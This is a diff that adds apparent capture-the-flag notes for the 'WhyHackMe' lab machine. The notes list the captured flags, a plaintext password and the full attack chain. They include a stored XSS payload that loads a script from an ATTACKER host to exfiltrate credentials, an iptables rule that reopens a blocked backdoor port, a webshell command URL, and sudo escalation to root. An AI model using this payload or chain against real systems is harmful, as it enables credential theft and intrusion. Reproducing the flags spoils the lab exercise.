@@ -1,0 +1,33 @@
+=== WhyHackMe — loot ===
+
+user.txt : 1ca4eb201787acbfcf9e70fca87b866a   (user: jack)
+root.txt : 4dbe2259ae53846441cc2479b5475c72   (root via www-data sudo NOPASSWD)
+
+--- accounts / creds ---
+jack : WhyIsMyPasswordSoStrongIDK
+  - SSH access as jack
+  - sudo -l => (ALL:ALL) /usr/sbin/iptables   (root, no pw)
+
+--- foothold chain ---
+1. FTP anonymous -> content/update.txt
+   hint: new-account creds at 127.0.0.1/dir/pass.txt (localhost only, "common account")
+2. Stored XSS in comment username field (blog.php renders username unsanitized).
+   Registered username = <script src="http://ATTACKER:8000/exfilPayload.js"></script>
+   exfilPayload.js (XHR GET /dir/pass.txt from server localhost -> exfil base64 to attacker)
+   admin bot viewed comment -> jack creds exfiltrated.
+
+--- privesc ---
+3. jack: sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
+   (was DROP; blocked attacker access to backdoor)
+4. nmap 41312 -> Apache/2.4.41 HTTPS
+5. /opt/capture.pcap (TLS) decrypted with /etc/apache2/certs/apache.key
+   -> webshell endpoint:
+   https://10.64.189.146:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=<cmd>
+   runs as www-data (gid 1003 h4ck3d)
+6. www-data: sudo -l => (ALL:ALL) NOPASSWD: ALL  -> root
+   sudo cat /root/root.txt
+
+--- notes ---
+* urgent.txt (/opt): cleanup of /usr/lib/cgi-bin h4ck3d files incomplete; iptables rule temp-blocked backdoor.
+* attacker IP used: 192.168.134.200 (tun0)
+EOF
